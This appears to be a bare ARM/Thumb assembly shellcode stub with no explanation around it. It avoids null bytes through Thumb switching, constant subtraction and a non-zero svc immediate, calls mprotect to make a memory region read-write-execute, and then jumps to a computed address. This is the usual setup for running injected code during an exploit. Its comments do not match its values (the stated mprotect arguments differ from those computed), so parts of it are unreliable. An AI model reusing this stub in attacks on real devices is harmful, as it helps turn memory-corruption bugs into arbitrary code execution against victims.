.section .text
.global _start
_start:
 .ARM
 add   r3, pc, #1       // switch to thumb mode 
 bx    r3

.THUMB
// mprotect(23000, 1024, 2) 
 ldr   r0, =0x01110102 
 ldr   r1, =0x01100102
 sub   r0, r0, r1
 ldr   r1, =#2000
 mov   r2, #7
 mov   r7, #125
 svc   #1          


 add r3, #7             // switch to normal mode
 bx r3

.ARM
 ADD R11, SP, #12
 LDR R1, [PC, #12]
 SUB PC, R1, #0x01000000



 
